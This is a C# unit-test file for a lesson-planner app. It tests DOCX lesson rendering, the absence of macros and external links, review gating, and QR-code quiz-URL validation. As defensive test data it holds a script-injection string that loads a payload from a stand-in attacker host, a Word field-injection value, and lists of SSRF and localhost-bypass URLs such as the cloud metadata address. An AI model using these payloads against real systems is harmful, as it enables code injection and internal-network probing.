using System.Buffers.Binary;
using System.IO.Compression;
using System.Text;
using System.Xml.Linq;
using DocumentFormat.OpenXml.Packaging;
using DocumentFormat.OpenXml.Validation;
using DocumentFormat.OpenXml.Wordprocessing;
using LessonPlanner.Core;
using LessonPlanner.Infrastructure.Rendering;
using QRCoder;

namespace LessonPlanner.UnitTests;

public sealed class LessonArtifactRenderingTests
{
    [Fact]
    public void DocxHasValidOpenXmlAndMeaningfulReviewedLessonContent()
    {
        var record = RetrievalRenderingFixtures.Lesson();
        var artifact = new OpenXmlLessonDocumentRenderer().Render(record);
        Assert.Equal("lesson-plan.docx", artifact.FileName);
        Assert.Equal(OpenXmlLessonDocumentRenderer.DocumentContentType, artifact.ContentType);
        using var stream = new MemoryStream(artifact.Content, writable: false);
        using var document = WordprocessingDocument.Open(stream, false);
        Assert.Empty(new OpenXmlValidator().Validate(document));
        var part = Assert.IsType<MainDocumentPart>(document.MainDocumentPart);
        var wordDocument = Assert.IsType<Document>(part.Document);
        var body = Assert.IsType<Body>(wordDocument.Body);
        var text = body.InnerText;
        Assert.Contains("Learning objectives", text, StringComparison.Ordinal);
        Assert.Contains("Robot sports day", text, StringComparison.Ordinal);
        Assert.Contains("Total: 60 minutes", text, StringComparison.Ordinal);
        Assert.Contains("10–35 min", text, StringComparison.Ordinal);
        Assert.Contains("Assessment questions", text, StringComparison.Ordinal);
        Assert.Contains("Sources and provenance", text, StringComparison.Ordinal);
        Assert.Contains("2026-10-01 12:00:00 UTC", text, StringComparison.Ordinal);
        Assert.NotNull(record.Lesson);
        Assert.Contains(record.Lesson.Sources[0].Sha256, text, StringComparison.Ordinal);
        Assert.Contains(record.Lesson.Sources[0].Url.AbsoluteUri, text, StringComparison.Ordinal);
        Assert.Contains($"[{record.Lesson.Sources[0].Id}]", text, StringComparison.Ordinal);
        Assert.Contains(record.Lesson.Objectives[0].Description, text, StringComparison.Ordinal);
        Assert.NotNull(part.StyleDefinitionsPart?.Styles);
        Assert.Contains(part.StyleDefinitionsPart.Styles.Elements<Style>(), style =>
            style.StyleId?.Value == "Heading1" && style.StyleParagraphProperties?.OutlineLevel?.Val?.Value == 0);
        Assert.DoesNotContain(record.Id, text, StringComparison.Ordinal);
        Assert.DoesNotContain(record.Owner.ObjectId.ToString(), text, StringComparison.Ordinal);
        Assert.DoesNotContain(record.Owner.TenantId.ToString(), text, StringComparison.Ordinal);
    }

    [Fact]
    public void HtmlXmlAndFieldLookingDataRemainLiteralText()
    {
        const string literal = "<script src=\"https://attacker.example.org/payload\">run()</script> & { INCLUDEPICTURE evil }";
        var record = RetrievalRenderingFixtures.Lesson();
        Assert.NotNull(record.Lesson);
        record = record with { Lesson = record.Lesson with { Explanation = literal + "\nExplain why this is plain text.\tCheck the comparison." } };
        var artifact = new OpenXmlLessonDocumentRenderer().Render(record);
        using var stream = new MemoryStream(artifact.Content, writable: false);
        using var document = WordprocessingDocument.Open(stream, false);
        var part = Assert.IsType<MainDocumentPart>(document.MainDocumentPart);
        var wordDocument = Assert.IsType<Document>(part.Document);
        Assert.Contains(literal, wordDocument.InnerText, StringComparison.Ordinal);
        Assert.Empty(wordDocument.Descendants<AltChunk>());
        Assert.Empty(wordDocument.Descendants<Hyperlink>());
        Assert.Empty(wordDocument.Descendants<SimpleField>());
        Assert.Empty(wordDocument.Descendants<FieldCode>());
        Assert.Single(wordDocument.Descendants<TabChar>());
        Assert.Single(wordDocument.Descendants<Break>());
        Assert.Empty(new OpenXmlValidator().Validate(document));
    }

    [Fact]
    public void DocxContainsNoMacrosEmbeddingsOrExternalRelationships()
    {
        var artifact = new OpenXmlLessonDocumentRenderer().Render(RetrievalRenderingFixtures.Lesson());
        using var stream = new MemoryStream(artifact.Content, writable: false);
        using var zip = new ZipArchive(stream, ZipArchiveMode.Read);
        Assert.NotNull(zip.GetEntry("[Content_Types].xml"));
        Assert.NotNull(zip.GetEntry("word/document.xml"));
        Assert.NotNull(zip.GetEntry("word/styles.xml"));
        foreach (var entry in zip.Entries)
        {
            Assert.DoesNotContain("vba", entry.FullName, StringComparison.OrdinalIgnoreCase);
            Assert.DoesNotContain("embeddings", entry.FullName, StringComparison.OrdinalIgnoreCase);
            Assert.DoesNotContain("altChunk", entry.FullName, StringComparison.OrdinalIgnoreCase);
            if (entry.FullName.EndsWith(".rels", StringComparison.OrdinalIgnoreCase))
            {
                using var content = entry.Open();
                var relationships = XDocument.Load(content);
                Assert.DoesNotContain(relationships.Descendants(), element => (string?)element.Attribute("TargetMode") == "External");
            }
        }
        var contentTypes = Assert.IsType<ZipArchiveEntry>(zip.GetEntry("[Content_Types].xml"));
        using var contentTypeStream = contentTypes.Open();
        Assert.DoesNotContain("macroEnabled", XDocument.Load(contentTypeStream).ToString(), StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void UnreviewedRejectedAndWrongSchemaLessonsCannotBeDownloaded()
    {
        var record = RetrievalRenderingFixtures.Lesson();
        var renderer = new OpenXmlLessonDocumentRenderer();
        Assert.Equal("document_not_ready", Assert.Throws<DomainException>(() => renderer.Render(record with { Review = null })).Code);
        Assert.Equal("document_not_ready", Assert.Throws<DomainException>(() => renderer.Render(record with { Review = new(false, []) })).Code);
        Assert.Equal("document_not_ready", Assert.Throws<DomainException>(() => renderer.Render(record with { Status = RunStatus.Rejected })).Code);
        Assert.Equal("document_not_ready", Assert.Throws<DomainException>(() => renderer.Render(record with { SchemaVersion = "future.v99" })).Code);
        Assert.Equal("document_not_ready", Assert.Throws<DomainException>(() => renderer.Render(record with
        {
            Review = new(true, [new("needs_revision", ReviewSeverity.Revision, "Revise the lesson first.")])
        })).Code);
    }

    [Fact]
    public void InvalidTimingsAndUnresolvableCitationsAreRevalidatedAtRendering()
    {
        var record = RetrievalRenderingFixtures.Lesson();
        Assert.NotNull(record.Lesson);
        var renderer = new OpenXmlLessonDocumentRenderer();
        Assert.Throws<DomainException>(() => renderer.Render(record with { Request = record.Request with { DurationMinutes = 45 } }));
        Assert.Throws<DomainException>(() => renderer.Render(record with { Lesson = record.Lesson with
        {
            Objectives = [new("This objective cites an unknown source identifier.", ["not-in-sources"])]
        } }));
    }

    [Fact]
    public void MalformedUnicodeIsRejectedBeforeOpenXmlSerialization()
    {
        var record = RetrievalRenderingFixtures.Lesson();
        Assert.NotNull(record.Lesson);
        var renderer = new OpenXmlLessonDocumentRenderer();
        var malformed = record with { Lesson = record.Lesson with { Explanation = record.Lesson.Explanation + '\ud800' } };
        Assert.Throws<DomainException>(() => renderer.Render(malformed));
    }

    [Theory]
    [InlineData("https://workshop.example.org/quiz/0123456789abcdef0123456789abcdef0123456789abcdef", false)]
    [InlineData("https://workshop.example.org/quiz/0123456789abcdef0123456789abcdef0123456789abcdef", true)]
    [InlineData("http://127.0.0.1:49152/quiz/0123456789abcdef0123456789abcdef0123456789abcdef", true)]
    [InlineData("http://localhost:60000/quiz/0123456789abcdef0123456789abcdef0123456789abcdef", true)]
    [InlineData("http://[::1]:65535/quiz/0123456789abcdef0123456789abcdef0123456789abcdef", true)]
    public void LocalQrPngMatchesTheExactCanonicalUrlModuleByModule(string input, bool allowHttpLocalhost)
    {
        var url = new Uri(input);
        var png = new LocalQuizQrRenderer(allowHttpLocalhost).Render(url);
        var image = ReadMonochromePng(png);
        using var expected = QRCodeGenerator.GenerateQrCode(url.AbsoluteUri, QRCodeGenerator.ECCLevel.Q,
            forceUtf8: true, utf8BOM: false);
        Assert.Equal(expected.ModuleMatrix.Count * 8, image.Width);
        Assert.Equal(image.Width, image.Height);
        for (var y = 0; y < image.Height; y++)
        {
            Assert.Equal(0, image.Scanlines[y * (image.BytesPerRow + 1)]);
            for (var x = 0; x < image.Width; x++)
            {
                var sample = (image.Scanlines[y * (image.BytesPerRow + 1) + 1 + x / 8] >> (7 - x % 8)) & 1;
                var isBlack = sample == 0;
                Assert.Equal(expected.ModuleMatrix[y / 8][x / 8], isBlack);
            }
        }
        Assert.All(expected.ModuleMatrix.Take(4), row => Assert.All(row.Cast<bool>(), value => Assert.False(value)));
    }

    [Theory]
    [InlineData("http://workshop.example.org/quiz/test")]
    [InlineData("https://user:password@workshop.example.org/quiz/test")]
    [InlineData("https://workshop.example.org/quiz/test?token=secret")]
    [InlineData("https://workshop.example.org/quiz/test#fragment")]
    [InlineData("https://workshop.example.org/")]
    [InlineData("https://WORKSHOP.example.org/quiz/test")]
    [InlineData("https://workshop.example.org:443/quiz/test")]
    [InlineData("https://workshop.example.org/quiz/../test")]
    [InlineData("https://localhost/quiz/test")]
    [InlineData("https://127.0.0.1/quiz/test")]
    [InlineData("https://127.1/quiz/test")]
    [InlineData("https://[::1]/quiz/test")]
    [InlineData("https://169.254.169.254/quiz/test")]
    [InlineData("https://10.0.0.1/quiz/test")]
    [InlineData("https://[::ffff:127.0.0.1]/quiz/test")]
    [InlineData("https://[2001:db8::1]/quiz/test")]
    [InlineData("https://intranet/quiz/test")]
    [InlineData("https://quiz.local/quiz/test")]
    [InlineData("https://quiz.internal/quiz/test")]
    [InlineData("https://workshop.example.org./quiz/test")]
    [InlineData("file:///quiz/test")]
    public void NonPublicUnsafeOrNoncanonicalQrUrlsAreRejected(string input)
    {
        var exception = Assert.Throws<DomainException>(() => new LocalQuizQrRenderer().Render(new Uri(input)));
        Assert.Equal("quiz_url_invalid", exception.Code);
    }

    [Fact]
    public void RelativeAndOversizedQrInputsAreRejected()
    {
        Assert.Throws<DomainException>(() => new LocalQuizQrRenderer().Render(new Uri("quiz/test", UriKind.Relative)));
        Assert.Throws<DomainException>(() => new LocalQuizQrRenderer().Render(new Uri("https://workshop.example.org/quiz/" + new string('a', 1024))));
    }

    [Theory]
    [InlineData("http://localhost:5000/quiz/test")]
    [InlineData("http://127.0.0.1:5000/quiz/test")]
    [InlineData("http://[::1]:5000/quiz/test")]
    [InlineData("https://localhost:5001/quiz/test")]
    [InlineData("http://127.0.0.1:49152/quiz/0123456789abcdef0123456789abcdef0123456789abcdef")]
    public void LocalVerificationRequiresExplicitOptIn(string input)
    {
        var url = new Uri(input);
        Assert.Equal("quiz_url_invalid", Assert.Throws<DomainException>(() => new LocalQuizQrRenderer().Render(url)).Code);
        Assert.Equal("quiz_url_invalid", Assert.Throws<DomainException>(() => new LocalQuizQrRenderer(allowHttpLocalhost: false).Render(url)).Code);
        var png = new LocalQuizQrRenderer(allowHttpLocalhost: true).Render(url);
        Assert.Equal(new byte[] { 137, 80, 78, 71, 13, 10, 26, 10 }, png[..8]);
    }

    [Theory]
    [InlineData("http://workshop.example.org/quiz/test")]
    [InlineData("http://localhost.attacker.example.org/quiz/test")]
    [InlineData("http://127.0.0.2:5000/quiz/test")]
    [InlineData("http://10.0.0.1:5000/quiz/test")]
    [InlineData("http://device.localhost:49152/quiz/test")]
    [InlineData("http://[::ffff:127.0.0.1]:49152/quiz/test")]
    [InlineData("https://10.0.0.1:49152/quiz/test")]
    [InlineData("https://127.0.0.2:49152/quiz/test")]
    [InlineData("http://localhost:5000/quiz/test?bypass=true")]
    [InlineData("http://127.0.0.1:5000/quiz/test#fragment")]
    [InlineData("http://127.1:49152/quiz/test")]
    public void LocalVerificationFlagDoesNotRelaxOtherUrlSafeguards(string input) =>
        Assert.Equal("quiz_url_invalid", Assert.Throws<DomainException>(() => new LocalQuizQrRenderer(allowHttpLocalhost: true).Render(new Uri(input))).Code);

    private sealed record MonochromePng(int Width, int Height, int BytesPerRow, byte[] Scanlines);
    private static MonochromePng ReadMonochromePng(byte[] bytes)
    {
        Assert.Equal(new byte[] { 137, 80, 78, 71, 13, 10, 26, 10 }, bytes[..8]);
        var offset = 8;
        var width = 0;
        var height = 0;
        var ended = false;
        using var compressed = new MemoryStream();
        while (offset < bytes.Length)
        {
            Assert.InRange(bytes.Length - offset, 12, int.MaxValue);
            var length = BinaryPrimitives.ReadInt32BigEndian(bytes.AsSpan(offset, 4));
            Assert.InRange(length, 0, bytes.Length - offset - 12);
            var type = Encoding.ASCII.GetString(bytes, offset + 4, 4);
            var data = bytes.AsSpan(offset + 8, length);
            if (type == "IHDR")
            {
                Assert.Equal(13, length);
                width = BinaryPrimitives.ReadInt32BigEndian(data[..4]);
                height = BinaryPrimitives.ReadInt32BigEndian(data.Slice(4, 4));
                Assert.Equal(1, data[8]);
                Assert.Equal(0, data[9]);
                Assert.Equal(0, data[10]);
                Assert.Equal(0, data[11]);
                Assert.Equal(0, data[12]);
            }
            else if (type == "IDAT") compressed.Write(data);
            else if (type == "IEND") { Assert.Equal(0, length); ended = true; }
            offset += length + 12;
        }
        Assert.True(ended);
        Assert.InRange(width, 100, 2048);
        Assert.InRange(height, 100, 2048);
        compressed.Position = 0;
        using var inflater = new ZLibStream(compressed, CompressionMode.Decompress);
        using var raw = new MemoryStream();
        inflater.CopyTo(raw);
        var bytesPerRow = (width + 7) / 8;
        Assert.Equal(height * (bytesPerRow + 1), raw.Length);
        return new(width, height, bytesPerRow, raw.ToArray());
    }
}
